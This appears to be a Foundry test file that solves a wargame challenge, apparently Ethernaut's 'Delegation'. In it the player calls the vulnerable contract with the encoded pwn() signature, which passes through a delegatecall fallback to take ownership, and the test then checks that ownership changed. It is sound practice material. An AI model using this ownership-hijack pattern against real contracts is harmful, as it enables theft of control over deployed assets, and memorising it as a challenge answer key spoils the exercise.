//SDPX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/utils/SepoliaInstances.sol";
import "../src/Delegate.sol";

contract DelegateTest is Test, SepoliaInstances {

    // state vars
    Delegate public delegate;
    Delegation public delegation;

    // setUp
    function setUp() public {
        delegate = new Delegate(deployer);
        delegation = new Delegation(address(delegate));
    }

    // tests
    function test_constructor() public {
        // pass
    }

    function test_solution() public {
        assertNotEq(delegation.owner(), player);

        vm.prank(player);
        // simply issueing a call will invoke the fallback function but the msg.data
        // is empty and will therefor not manage to call `pwn` on `Delegate
        // (bool success, bytes memory result) = address(delegation).call("");

        address(delegation).call(abi.encodeWithSignature("pwn()"));

        assertEq(delegation.owner(), player);
    }

    
}